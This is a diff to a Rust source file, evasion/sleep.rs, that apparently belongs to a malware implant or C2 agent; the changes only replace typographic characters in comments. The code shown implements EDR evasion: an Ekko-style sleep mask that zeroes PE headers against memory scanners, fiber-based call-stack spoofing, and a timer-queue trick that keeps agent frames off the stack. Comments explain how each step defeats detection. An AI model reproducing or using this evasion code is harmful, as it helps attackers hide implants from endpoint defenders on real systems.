@@ -1,11 +1,11 @@
 // evasion/sleep.rs
 //
 // Sleep-interval memory protection:
-//   - sleep_with_spoofed_stack  — fiber-based clean call stack (legacy, used
+//   - sleep_with_spoofed_stack - fiber-based clean call stack (legacy, used
 //                                 by fallback paths; ekko_sleep supersedes it)
-//   - agent_text_section        — locates .text VA+size via PE header walk
-//   - ekko_sleep                — full Ekko-style sleep mask (Gaps 1-4)
-//   - restore_headers           — private helper for PE header restoration
+//   - agent_text_section - locates .text VA+size via PE header walk
+//   - ekko_sleep - full Ekko-style sleep mask (Gaps 1-4)
+//   - restore_headers - private helper for PE header restoration
 //
 // See the gap-analysis comment inside ekko_sleep for a description of what
 // each protection addresses.
@@ -14,11 +14,11 @@
 // Converts the current thread to a fiber, creates a clean fiber whose
 // only job is to call Sleep(), switches to it, and switches back on wake.
 // During Sleep() the active fiber's stack contains only
-//   kernel32!Sleep → ntdll!NtDelayExecution
+//   kernel32!Sleep -> ntdll!NtDelayExecution
 // so EDR stack walkers see no unbacked agent frames.
 //
 // Superseded by ekko_sleep, which adds PE header erasure and timer-thread
-// wake dispatch.  Kept for the error-path fallback in sleep_with_mask.
+// wake dispatch. Kept for the error-path fallback in sleep_with_mask.
 
 #[cfg(target_os = "windows")]
 pub fn sleep_with_spoofed_stack(duration_ms: u32) {
@@ -127,34 +127,34 @@ pub fn agent_text_section() -> Option<(*mut u8, usize)> { None }
 //
 // Addresses four gaps in the prior stack-only sleep mask:
 //
-// Gap 1 — PE image protection
+// Gap 1 - PE image protection
 //   The MZ/PE header region (first 4 KiB of the loaded module) is backed up
-//   and zeroed before sleep, then restored on wakeup.  Headers are
-//   read-only metadata; no executing code uses them at runtime.  Zeroing
+//   and zeroed before sleep, then restored on wakeup. Headers are
+//   read-only metadata; no executing code uses them at runtime. Zeroing
 //   removes the MZ magic, timestamp, EntryPoint RVA, and other high-
 //   confidence field-value signatures that memory scanners match.
 //
 //   Full .text encryption is not performed here: in a standalone EXE the
-//   decrypt callback must itself execute from .text — encrypting .text
-//   before the callback runs produces a crash.  For reflective/shellcode
+//   decrypt callback must itself execute from .text - encrypting .text
+//   before the callback runs produces a crash. For reflective/shellcode
 //   deployments (client_dll), call encrypt_text_section/decrypt_text_section
 //   from the loader before and after the sleep interval.
 //
-// Gap 2 — Self-location
+// Gap 2 - Self-location
 //   agent_text_section() (above) locates .text VA+size via PE header walk.
 //
-// Gap 3 — Timer-thread dispatch
-//   The wake signal is sent via CreateTimerQueueTimer.  SetEvent is
+// Gap 3 - Timer-thread dispatch
+//   The wake signal is sent via CreateTimerQueueTimer. SetEvent is
 //   transmuted to WAITORTIMERCALLBACK and used as the callback directly,
 //   so the timer-pool thread runs only Windows code during the entire sleep
-//   — no agent frames ever appear on the timer thread.
+//   - no agent frames ever appear on the timer thread.
 //
-// Gap 4 — Multi-thread stack coverage
+// Gap 4 - Multi-thread stack coverage
 //   The sleeping thread converts to a fiber and parks in a clean fiber
-//   that blocks on the wake event.  A stack walker sees only:
-//     ntdll!NtWaitForSingleObject  ← kernel wait
+//   that blocks on the wake event. A stack walker sees only:
+//     ntdll!NtWaitForSingleObject ← kernel wait
 //     kernel32!WaitForSingleObjectEx
-//     clean_fiber_proc             ← .text, suspended fiber context
+//     clean_fiber_proc ← .text, suspended fiber context
 //   EDR walkers examine only the *active* fiber's stack; the clean fiber
 //   is active only for the microseconds before/after the wait.
 
@@ -194,7 +194,7 @@ pub fn ekko_sleep(duration_ms: u32) {
     const PAGE_READONLY:      u32 = 0x02;
     const PAGE_READWRITE:     u32 = 0x04;
     const WT_EXECUTEONLYONCE: u32 = 0x00000008;
-    const HEADER_BACKUP:     usize = 0x1000; // 4 KiB — covers all standard PE headers
+    const HEADER_BACKUP:     usize = 0x1000; // 4 KiB - covers all standard PE headers
     let invalid_handle: *mut c_void = -1_isize as *mut c_void; // INVALID_HANDLE_VALUE
 
     // ── Shared state between agent fiber and clean fiber ───────────────
@@ -206,8 +206,8 @@ pub fn ekko_sleep(duration_ms: u32) {
     }
 
     // Clean fiber entry point.
-    // Blocks on wake_event (non-alertable — no APC interruption), then
-    // switches back to the agent fiber.  The loop at the end is a safety
+    // Blocks on wake_event (non-alertable - no APC interruption), then
+    // switches back to the agent fiber. The loop at the end is a safety
     // net; it should never be reached in normal operation.
     unsafe extern "system" fn clean_fiber_proc(param: *mut c_void) {
         let d = &*(param as *const CleanFiberData);
@@ -253,8 +253,8 @@ pub fn ekko_sleep(duration_ms: u32) {
             return;
         }
 
-        // ── 3. Timer queue — SetEvent as callback (Gap 3) ─────────────
-        // SetEvent(HANDLE)→BOOL is ABI-compatible with WAITORTIMERCALLBACK
+        // ── 3. Timer queue - SetEvent as callback (Gap 3) ─────────────
+        // SetEvent(HANDLE)->BOOL is ABI-compatible with WAITORTIMERCALLBACK
         // on x86-64: rcx = event handle, rdx (BOOLEAN) is ignored by
         // SetEvent, rax (BOOL return) is ignored by the timer infrastructure.
         // The timer-pool thread therefore runs only ntdll/kernel32 code.
@@ -268,7 +268,7 @@ pub fn ekko_sleep(duration_ms: u32) {
             return;
         }
 
-        // SAFETY: fn(PVOID)→BOOL transmuted to fn(PVOID,BOOLEAN)→void;
+        // SAFETY: fn(PVOID)->BOOL transmuted to fn(PVOID,BOOLEAN)->void;
         // calling convention is compatible on x86-64 Windows as noted above.
         let set_event_cb: Option<unsafe extern "system" fn(*mut c_void, u8)> =
             Some(std::mem::transmute(
@@ -282,7 +282,7 @@ pub fn ekko_sleep(duration_ms: u32) {
             set_event_cb,
             wake_event,       // passed to SetEvent as HANDLE
             duration_ms,      // fire after this many milliseconds
-            0,                // period = 0 → one-shot
+            0,                // period = 0 -> one-shot
             WT_EXECUTEONLYONCE,
         );
 
@@ -290,7 +290,7 @@ pub fn ekko_sleep(duration_ms: u32) {
         let agent_fiber = ConvertThreadToFiber(ptr::null_mut());
 
         if agent_fiber.is_null() {
-            // Already a fiber or conversion failed — fall back to direct wait.
+            // Already a fiber or conversion failed - fall back to direct wait.
             WaitForSingleObjectEx(wake_event, duration_ms + 10_000, 0);
         } else {
             let mut fdata = CleanFiberData {
